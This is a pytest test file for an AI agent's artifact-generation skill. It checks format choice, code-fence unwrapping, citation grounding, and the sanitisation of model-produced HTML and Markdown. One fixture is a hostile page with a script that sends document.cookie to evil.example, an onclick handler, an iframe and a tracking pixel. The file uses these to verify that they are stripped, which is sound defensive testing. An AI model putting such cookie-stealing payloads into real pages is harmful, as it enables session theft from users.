"""The artifact skill: format choice, unwrapping, sanitisation, packaging.

Sanitisation itself is tested exhaustively in `test_sanitize.py`. What is tested
here is that the skill actually *applies* it -- that a model returning a page
full of scripts produces a stored artifact with none, that `raw_content` never
reaches the client-facing payload, and that a rejected artifact ends the turn
with a clear refusal rather than an exception.
"""

from __future__ import annotations

import pytest

from app.agent.contracts import Intent, SkillContext
from app.agent.skills.artifact import ArtifactSkill, choose_kind
from app.config import Settings
from app.llm.base import ChatMessage
from app.retrieval.retriever import RetrievalResult
from tests.conftest import make_chunk as _chunk
from tests.test_knowledge_qa import FakeRetriever, ScriptedGateway


def _settings(**overrides) -> Settings:
    return Settings(_env_file=None, **overrides)


def _result(confidence: float = 0.8, n: int = 2) -> RetrievalResult:
    return RetrievalResult(
        chunks=[_chunk(i, f"passage {i}") for i in range(1, n + 1)],
        method="hybrid",
        confidence=confidence,
        query="q",
    )


def _skill(answers: list[str], confidence: float = 0.8):
    gateway = ScriptedGateway(answers)
    return ArtifactSkill(_settings(), gateway, FakeRetriever(_result(confidence))), gateway


async def _run(skill: ArtifactSkill, message: str, history=None):
    ctx = SkillContext(message=message, history=history or [])
    events = [e async for e in skill.run(ctx)]
    result = next(e.result for e in events if e.kind == "result")
    return events, result


# -------------------------------------------------------------- format choice --


@pytest.mark.parametrize(
    "message",
    [
        "Create an HTML landing page for this",
        "Build me a web page",
        "Give me a styled one-pager in HTML and CSS",
        "Make a wireframe mockup",
    ],
)
def test_html_is_chosen_when_asked_for(message: str) -> None:
    assert choose_kind(message) == "html"


@pytest.mark.parametrize(
    "message",
    [
        "Give me a launch checklist",
        "Turn this into a one-pager",
        "Write up a markdown doc",
        "Make me something useful",
        "",
    ],
)
def test_markdown_is_the_default(message: str) -> None:
    """Ties and silence go to Markdown: rendering untrusted HTML is the
    higher-risk path, so an ambiguous request must not select it."""
    assert choose_kind(message) == "markdown"


# ------------------------------------------------------------------ markdown --


async def test_produces_a_markdown_artifact() -> None:
    skill, _ = _skill(["# Launch checklist\n\n- [ ] Instrument activation [S1]\n"])
    events, result = await _run(skill, "Give me a launch checklist")

    assert not result.refused
    assert result.intent is Intent.ARTIFACT
    assert result.artifact["kind"] == "markdown"
    assert result.artifact["title"] == "Launch checklist"
    assert "- [ ] Instrument activation" in result.artifact["content"]
    assert any(e.kind == "artifact" for e in events)


async def test_markdown_artifact_has_embedded_html_escaped() -> None:
    skill, _ = _skill(["# Doc\n\n<script>alert(1)</script>\n\nReal content [S1]"])
    _, result = await _run(skill, "Give me a checklist")

    assert "<script>" not in result.artifact["content"]
    assert "&lt;script&gt;" in result.artifact["content"]
    assert "script" in result.artifact["sanitization"]["removed_tags"]


# ---------------------------------------------------------------------- html --


async def test_produces_a_sanitised_html_document() -> None:
    page = (
        "<html><head><title>Activation one-pager</title>"
        "<style>body { color: #222; } h1 { font-size: 2rem; }</style></head>"
        "<body><h1>Activation</h1><p>Instrument the first session [S1].</p></body></html>"
    )
    skill, _ = _skill([page])
    _, result = await _run(skill, "Make an HTML one-pager")

    content = result.artifact["content"]
    assert result.artifact["kind"] == "html"
    assert result.artifact["title"] == "Activation one-pager"
    assert content.startswith("<!doctype html>")
    assert "Content-Security-Policy" in content
    assert "color: #222" in content  # the model's CSS survived
    assert "<h1>Activation</h1>" in content


async def test_a_hostile_page_is_stored_with_nothing_executable() -> None:
    page = (
        "<h1 onclick='steal()'>Landing</h1>"
        "<script>fetch('https://evil.example/?c='+document.cookie)</script>"
        "<iframe src='https://evil.example'></iframe>"
        "<a href='javascript:alert(1)'>click</a>"
        "<style>body { background: url('https://evil.example/pixel') }</style>"
        "<p>Real copy about activation [S1].</p>"
    )
    skill, _ = _skill([page])
    _, result = await _run(skill, "Build an HTML landing page")

    content = result.artifact["content"].lower()
    assert "<script" not in content
    assert "onclick" not in content
    assert "<iframe" not in content
    assert "javascript:" not in content
    assert "evil.example" not in content
    assert "real copy about activation" in content


async def test_the_sandbox_contract_travels_with_the_artifact() -> None:
    skill, _ = _skill(["<h1>Page</h1><p>Body [S1]</p>"])
    _, result = await _run(skill, "Make an HTML page")

    sandbox = result.artifact["sandbox"]
    assert sandbox is not None
    assert "allow-same-origin" not in sandbox
    assert "allow-scripts" not in sandbox


async def test_markdown_artifacts_carry_no_sandbox_attribute() -> None:
    """There is no iframe to sandbox -- claiming one would be noise in the API."""
    skill, _ = _skill(["# Doc\n\nBody [S1]"])
    _, result = await _run(skill, "Give me a checklist")
    assert result.artifact["sandbox"] is None


async def test_a_fenced_response_is_unwrapped() -> None:
    skill, _ = _skill(["Here you go!\n```html\n<h1>Page</h1><p>Body [S1]</p>\n```"])
    _, result = await _run(skill, "Make an HTML page")
    assert "Here you go" not in result.artifact["content"]
    assert "<h1>Page</h1>" in result.artifact["content"]


async def test_a_markdown_doc_keeps_its_own_code_sample() -> None:
    """A fence is unwrapped only when it *is* the artifact -- a document that
    legitimately contains a code sample must not be reduced to that sample."""
    doc = "# Guide\n\nRun this [S1]:\n\n```bash\nmake ingest\n```\n\nThen check health [S1]."
    skill, _ = _skill([doc])
    _, result = await _run(skill, "Write a markdown guide")
    assert "# Guide" in result.artifact["content"]
    assert "make ingest" in result.artifact["content"]


# ---------------------------------------------------------------- boundaries --


async def test_raw_content_is_kept_for_debugging_but_never_sent_to_a_client() -> None:
    page = "<h1>Page</h1><script>alert(1)</script><p>Body [S1]</p>"
    skill, _ = _skill([page])
    _, result = await _run(skill, "Make an HTML page")

    # The skill's record carries it, for persistence and later diagnosis...
    assert "<script>" in result.artifact["raw_content"]
    # ...and the serialised result, which is what the API streams, does not.
    wire = result.as_dict()
    assert "raw_content" not in wire["artifact"]
    assert "<script>" not in wire["artifact"]["content"]


async def test_an_artifact_that_fails_verification_refuses_instead_of_crashing(
    monkeypatch,
) -> None:
    import app.agent.sanitize as sanitize_mod

    monkeypatch.setattr(sanitize_mod.nh3, "clean", lambda *a, **k: "<script>alert(1)</script>")
    skill, _ = _skill(["<h1>Page</h1><p>Body [S1]</p>"])
    _, result = await _run(skill, "Make an HTML page")

    assert result.refused
    assert result.grounding["reason"] == "failed_sanitisation"
    assert result.artifact is None


async def test_an_empty_model_response_refuses() -> None:
    skill, _ = _skill([""])
    _, result = await _run(skill, "Make an HTML page")
    assert result.refused
    assert result.grounding["reason"] == "generation_failed"


# ----------------------------------------------------------------- grounding --


async def test_passages_are_supplied_and_cited_when_retrieval_is_confident() -> None:
    skill, gateway = _skill(["# Checklist\n\n- Do the thing [S1]\n"])
    _, result = await _run(skill, "Give me a checklist")

    assert "Transcript passages" in gateway.calls[0][-1].content
    assert result.grounding["grounded"] is True
    assert result.grounding["cited_indices"] == [1]
    assert result.sources


async def test_a_weakly_grounded_request_still_produces_an_artifact_and_says_so() -> None:
    """A checklist is a work product, not a claim about what someone said on a
    podcast. Refusing it for want of citations would produce no checklist, not
    a more honest one -- so it is built, and labelled."""
    skill, gateway = _skill(["# Checklist\n\n- Do the thing\n"], confidence=0.1)
    _, result = await _run(skill, "Give me a launch checklist")

    assert not result.refused
    assert result.grounding["grounded"] is False
    assert result.grounding["reason"] == "conversation_only"
    assert "Transcript passages" not in gateway.calls[0][-1].content
    assert result.sources == []


async def test_an_invented_marker_is_stripped_from_the_artifact() -> None:
    skill, _ = _skill(["# Checklist\n\n- Do the thing [S7]\n- And this [S1]\n"])
    _, result = await _run(skill, "Give me a checklist")
    assert "[S7]" not in result.artifact["content"]
    assert "[S1]" in result.artifact["content"]


async def test_the_conversation_is_used_as_the_brief() -> None:
    history = [
        ChatMessage(role="user", content="How do I improve activation?"),
        ChatMessage(role="assistant", content="Instrument the first session [S1]."),
    ]
    skill, gateway = _skill(["# Checklist\n\n- Instrument it [S1]\n"])
    await _run(skill, "Turn that into a checklist", history=history)

    prompt = gateway.calls[0][-1].content
    assert "Instrument the first session" in prompt
